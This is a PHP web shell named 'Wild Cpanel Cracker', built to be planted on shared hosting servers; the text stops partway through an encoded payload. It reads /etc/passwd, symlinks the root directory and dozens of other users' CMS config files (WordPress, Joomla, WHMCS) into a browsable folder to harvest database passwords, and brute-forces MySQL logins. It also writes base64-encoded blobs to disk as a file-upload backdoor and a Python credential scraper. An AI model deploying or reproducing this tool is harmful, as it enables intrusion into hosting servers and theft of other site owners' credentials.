<?php
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@ini_set('display_errors', 0);
@ini_set('output_buffering',0); 
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 

?>
<html>
<title>Wild Cpanel Cracker</title>
<body>

<STYLE>textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 10px;font-family: Tahoma; border: 1px solid #000000;}
input{FONT-WEIGHT:normal;background-color: #105700;font-size: 10px;font-weight:bold;color: lime; font-family: Tahoma; border: 1px solid #666666;height:20 }
body { font-family: Tahoma}
.MadKjubi { font-family: arial}
tr { BORDER: dashed 1px #333; color: lime; }
td { BORDER: dashed 1px #333; color: lime; }
.table1 { BORDER: 0px Black; BACKGROUND-COLOR: Black; color: lime; }
.td1 { BORDER: 0px; BORDER-COLOR: #333333; font: 8pt Verdana; color: #00ff00; }
.tr1 { BORDER: 0px; BORDER-COLOR: #333333; color: lime; }
table { BORDER: dashed 1px #333; BORDER-COLOR: #333333; BACKGROUND-COLOR: Black; color: lime; }
input { border: dashed 1px; border-color: #333; BACKGROUND-COLOR: Black; font: 8pt Verdana; color: lime; }
select { BORDER-RIGHT:  Black 1px solid; BORDER-TOP: lime 1px solid; BORDER-LEFT:  lime 1px solid; BORDER-BOTTOM: Black 1px solid; BORDER-color: lime; BACKGROUND-COLOR: Black; font: pt Verdana; color: lime; }
submit { BORDER:  buttonhighlight 2px outset; BACKGROUND-COLOR: Black; width: 30%; color: lime; }
textarea { border: dashed 1px #333; BACKGROUND-COLOR: Black; font: Fixedsys bold; color: #999; }
BODY {	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: lime; SCROLLBAR-SHADOW-color: lime; SCROLLBAR-3DLIGHT-color: lime; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: lime; SCROLLBAR-DARKSHADOW-color: lime; margin: 1px; color: #00ff00; background-color: Black; }
.main { margin: -287px 0px 0px -490px; BORDER: dashed 1px #333; BORDER-COLOR: #333333; }
.tt { background-color: Black; }
A:link { COLOR: White; TEXT-DECORATION: none }
A:visited {	COLOR: White; TEXT-DECORATION: none }
A:hover { color: #00ff00; TEXT-DECORATION: none }
A:active { color: #00ff00; TEXT-DECORATION: none }
</STYLE>


<?php
@ini_set('display_errors', 0);
@ini_set('output_buffering',0); 
echo "<center>

<b><font color='#00ff00' class='MadKjubi' size='5'>WildClique Cpanel Cracker </font><br><br><br></b><b>
<font size='3'>
|| <a href='?do=uploader'>./Uploader</a> | <a href='?do=config'>./Config</a> | <a href='?do=delivery'>./Delivery Check</a> | <a href='?do=brute'>./Cpanel BruteForce</a> ||</b><br><br><br></center></font><br> ";

if(isset($_REQUEST['do'])){ 
switch ($_REQUEST['do']){
case 'delivery';
echo "<center/><br/><b><font color=lime>+--==[ Delivery Test ]==--+</font></b><br><br>";
 
$confshell = 'PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCj8+DQo8Y2VudGVyPg0KPFNUWUxFPnRleHRhcmVhe2JhY2tncm91bmQtY29sb3I6IzEwNTcwMDtjb2xvcjpsaW1lO2ZvbnQtd2VpZ2h0OmJvbGQ7Zm9udC1zaXplOiAxMHB4O2ZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICMwMDAwMDA7fQ0KaW5wdXR7Rk9OVC1XRUlHSFQ6bm9ybWFsO2JhY2tncm91bmQtY29sb3I6ICMxMDU3MDA7Zm9udC1zaXplOiAxMHB4O2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6IGxpbWU7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7aGVpZ2h0OjIwIH0NCmJvZHkgeyBmb250LWZhbWlseTogVGFob21hfQ0KLk1hZEtqdWJpIHsgZm9udC1mYW1pbHk6IGFyaWFsfQ0KdHIgeyBCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsgY29sb3I6IGxpbWU7IH0NCnRkIHsgQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7IGNvbG9yOiBsaW1lOyB9DQpiIHsgY29sb3I6IGxpbWU7IH0NCi50YWJsZTEgeyBCT1JERVI6IDBweCBCbGFjazsgQkFDS0dST1VORC1DT0xPUjogQmxhY2s7IGNvbG9yOiBsaW1lOyB9DQoudGQxIHsgQk9SREVSOiAwcHg7IEJPUkRFUi1DT0xPUjogIzMzMzMzMzsgZm9udDogOHB0IFZlcmRhbmE7IGNvbG9yOiBsaW1lMDA7IH0NCi50cjEgeyBCT1JERVI6IDBweDsgQk9SREVSLUNPTE9SOiAjMzMzMzMzOyBjb2xvcjogbGltZTsgfQ0KdGFibGUgeyBCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsgQk9SREVSLUNPTE9SOiAjMzMzMzMzOyBCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsgY29sb3I6IGxpbWU7IH0NCmlucHV0IHsgYm9yZGVyOiBkYXNoZWQgMXB4OyBib3JkZXItY29sb3I6ICMzMzM7IEJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOyBmb250OiA4cHQgVmVyZGFuYTsgY29sb3I6IGxpbWU7IH0NCnNlbGVjdCB7IEJPUkRFUi1SSUdIVDogIEJsYWNrIDFweCBzb2xpZDsgQk9SREVSLVRPUDogICAgbGltZSAxcHggc29saWQ7IEJPUkRFUi1MRUZUOiAgIGxpbWUgMXB4IHNvbGlkOyBCT1JERVItQk9UVE9NOiBCbGFjayAxcHggc29saWQ7IEJPUkRFUi1jb2xvcjogbGltZTsgQkFDS0dST1VORC1DT0xPUjogQmxhY2s7IGZvbnQ6IHB0IFZlcmRhbmE7IGNvbG9yOiBsaW1lOyB9DQpzdWJtaXQgeyBCT1JERVI6ICBidXR0b25oaWdobGlnaHQgMnB4IG91dHNldDsgQkFDS0dST1VORC1DT0xPUjogQmxhY2s7IHdpZHRoOiAzMCU7IGNvbG9yOiBsaW1lOyB9DQp0ZXh0YXJlYSB7IGJvcmRlcjogZGFzaGVkIDFweCAjMzMzOyBCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsgZm9udDogRml4ZWRzeXMgYm9sZDsgY29sb3I6ICM5OTk7IH0NCkJPRFkgewlTQ1JPTExCQVItRkFDRS1DT0xPUjogQmxhY2s7IFNDUk9MTEJBUi1ISUdITElHSFQtY29sb3I6IGxpbWU7IFNDUk9MTEJBUi1TSEFET1ctY29sb3I6IGxpbWU7IFNDUk9MTEJBUi0zRExJR0hULWNvbG9yOiBsaW1lOyBTQ1JPTExCQVItQVJST1ctQ09MT1I6IEJsYWNrOyBTQ1JPTExCQVItVFJBQ0stY29sb3I6IGxpbWU7IFNDUk9MTEJBUi1EQVJLU0hBRE9XLWNvbG9yOiBsaW1lIG1hcmdpbjogMXB4OyBjb2xvcjogbGltZTAwOyBiYWNrZ3JvdW5kLWNvbG9yOiBCbGFjazsgfQ0KLm1haW4geyBtYXJnaW46IC0yODdweCAwcHggMHB4IC00OTBweDsgQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7IEJPUkRFUi1DT0xPUjogIzMzMzMzMzsgfQ0KLnR0IHsgYmFja2dyb3VuZC1jb2xvcjogQmxhY2s7IH0NCkE6bGluayB7IENPTE9SOiBXaGl0ZTsgVEVYVC1ERUNPUkFUSU9OOiBub25lIH0NCkE6dmlzaXRlZCB7CUNPTE9SOiBXaGl0ZTsgVEVYVC1ERUNPUkFUSU9OOiBub25lIH0NCkE6aG92ZXIgeyBjb2xvcjogbGltZTAwOyBURVhULURFQ09SQVRJT046IG5vbmUgfQ0KQTphY3RpdmUgeyBjb2xvcjogbGltZTAwOyBURVhULURFQ09SQVRJT046IG5vbmUgfQ0KPC9TVFlMRT4NCjxmb250IGNvbG9yPSJsaW1lIj5VcGxvYWQgaXMgV09SS0lORzxicj4NCkNoZWNrICBNYWlsbGluZyAuLjxicj48L2ZvbnQ+DQo8Ym9keSBiZ2NvbG9yPSJ3aGl0ZSI+DQo8Zm9ybSBtZXRob2Q9InBvc3QiPg0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImVtYWlsIiB2YWx1ZT0iPD9waHAgcHJpbnQgJF9QT1NUWydlbWFpbCddPz4icmVxdWlyZWQgPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNlbmQgdGVzdCA+PiI+DQo8L2Zvcm0+DQo8L2NlbnRlcj4NCjxicj4NCjw/cGhwDQppZiAoIWVtcHR5KCRfUE9TVFsnZW1haWwnXSkpew0KJHh4ID0gcmFuZCgpOw0KbWFpbCgkX1BPU1RbJ2VtYWlsJ10sIlJlc3VsdCBSZXBvcnQgVGVzdCAtICIuJHh4LCJXT1JLSU5HICEiKTsNCnByaW50ICI8Y2VudGVyPjxiPnNlbmQgYW4gcmVwb3J0IHRvIFsiLiRfUE9TVFsnZW1haWwnXS4iXSAtICR4eDwvYj48L2NlbnRlcj4iOyANCn0NCj8+'; 
$file = fopen("delcheck.php" ,"w+");
$write = fwrite ($file ,base64_decode($confshell));
fclose($file);
fclose($indexshell);
   echo "<iframe src='/delcheck.php' width=50% height=50% frameborder=0></iframe>"; 
break;

################CMS DETECTOR
case 'config';
$byphp = "safe_mode = Off
		disable_functions = None
		";
file_put_contents("php.ini",$byphp);

echo '<CENTER><b>+--=[ Config priv8 ]=--+</b><br><br>';
?>

<bR><form method=post>
	<textarea rows=20 cols=85 name=user><?php  $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br>
	<input type=submit name=su value="Lets Start" /></form></CENTER>
	<?php
	error_reporting(0);
	echo "<font color=#00ff size=2 face=\"comic sans ms\">";
	if(isset($_POST['su']))
	{
	mkdir('Kjubi',0777);
$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  Options +FollowSymlinks \n DirectoryIndex itti.html \n RemoveHandler .php";
$g = fopen('Kjubi/.htaccess','w');
fwrite($g,$rr);
$indishell = symlink("/","Kjubi/root");
		    $rt="<a href=Kjubi/root><font color=white size=3 face=\"comic sans ms\"> OwN3d</font></a>";
        echo "Please check link given below for / folder symlink <br><u>$rt</u>";
		
		$dir=mkdir('KjubiConfig',0777);
		$r  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  Options +FollowSymlinks \n DirectoryIndex itti.html \n RemoveHandler .php";
        $f = fopen('KjubiConfig/.htaccess','w');
   
        fwrite($f,$r);
        $consym="<a href=KjubiConfig/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
       	echo "<br>The link given below for configuration file symlink...open it, once processing finish <br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
       	
       		$usr=explode("\n",$_POST['user']);
       	$configuration=array("wp-config.php",
		"wordpress/wp-config.php",
		"web/wp-config.php",
		"wp/wp-config.php",
		"press/wp-config.php",
		"wordpress/beta/wp-config.php",
		"news/wp-config.php",
		"new/wp-config.php",
		"blogs/wp-config.php",
		"home/wp-config.php",
		"blog/wp-config.php",
		"protal/wp-config.php",
		"site/wp-config.php",
		"main/wp-config.php",
		"test/wp-config.php",
		"wp/beta/wp-config.php",
		"beta/wp-config.php",
		"joomla/configuration.php",
		"protal/configuration.php",
		"joo/configuration.php",
		"cms/configuration.php",
		"site/configuration.php",
		"main/configuration.php",
		"news/configuration.php",
		"new/configuration.php",
		"home/configuration.php",
		"configuration.php",
		"SSI.php",
		"forum/SSI.php",
		"forum/inc/config.php",
		"forum/includes/config.php",
		"upload/includes/config.php",
		"cc/includes/config.php",
		"vb/includes/config.php",
		"vb3/includes/config.php",
		"cpanel/configuration.php",
		"panel/configuration.php",
		"ubmitticket.php",
		"manage/configuration.php",
		"myshop/configuration.php",
		"beta/configuration.php",
		"includes/config.php",
		"lib/config.php",
		"conf_global.php",
		"inc/config.php",
		"incl/config.php",
		"include/db.php",
		"include/config.php",
		"includes/functions.php",
		"includes/dist-configure.php",
		"connect.php",
		"mk_conf.php",
		"config/koneksi.php",
		"system/sistem.php",
		"config.php",
		"Settings.php",
		"settings.php",
		"sites/default/settings.php",
		"smf/Settings.php",
		"forum/Settings.php",
		"forums/Settings.php",
		"host/configuration.php",
		"hosting/configuration.php",
		"hosts/configuration.php",
		"zencart/includes/dist-configure.php",
		"shop/includes/dist-configure.php",
		"whm/configuration.php",
		"whmc/configuration.php",
		"whmcs/configuration.php",
		"whmc/WHM/configuration.php",
		"whm/WHMCS/configuration.php",
		"whm/whmcs/configuration.php",
		"order/configuration.php",
		"support/configuration.php",
		"supports/configuration.php",
		"oscommerce/includes/configure.php",
		"oscommerces/includes/configure.php",
		"shopping/includes/configure.php",
		"sale/includes/configure.php",
		"config.inc.php",
		"amember/config.inc.php",
		"clients/configuration.php",
		"client/configuration.php",
		"clientes/configuration.php",
		"cliente/configuration.php",
		"clientsupport/configuration.php",
		"billing/configuration.php",
		"billings/configuration.php",
		"admin/conf.php",
		"admin/config.php");
		foreach($usr as $uss )
		{
			$us=trim($uss);
						
			foreach($configuration as $c)
			{
			 $rs="/home/".$us."/public_html/".$c;
			 $r="KjubiConfig/".$us." .. ".$c;
			 symlink($rs,$r);
			
		}
			
			}
		
		
		}
break;
///////////////////////////////////
case'file';


break;
###################################

case 'brute';?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
/*
Recoded By Kjubi
*/
@set_time_limit(0);
@error_reporting(0);


if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "X'1n73ct ~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>You Found <font color=green>$ok</font> Cpanel by Kjubi</b>";
    echo "<center><b><a href=".$_SERVER['PHP_SELF']."><< BACK</a>";
    exit;
}
}
if($_POST['pass']=='password'){
@error_reporting(0);
$i = getenv('REMOTE_ADDR');
$d = date('D, M jS, Y H:i',time());
$h = $_SERVER['HTTP_HOST'];
$dir=$_SERVER['PHP_SELF'];
$back = "PD9waHANCmVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7DQplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsNCmlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsNCmlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKSB7IGVjaG8gJzxiPktvcmFuZyBEYWggQmVyamF5YSBVcGxvYWQgU2hlbGwgS29yYW5nISEhPGI+PGJyPjxicj4nOyB9DQplbHNlIHsgZWNobyAnPGI+S29yYW5nIEdhZ2FsIFVwbG9hZCBTaGVsbCBLb3JhbmchISE8L2I+PGJyPjxicj4nOyB9DQp9DQo/Pg==";
$file = fopen(".php","w+");
$write = fwrite ($file ,base64_decode($back));
fclose($file);
chmod(".php",0755);
mkdir('config',0755);
$cp =
'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIo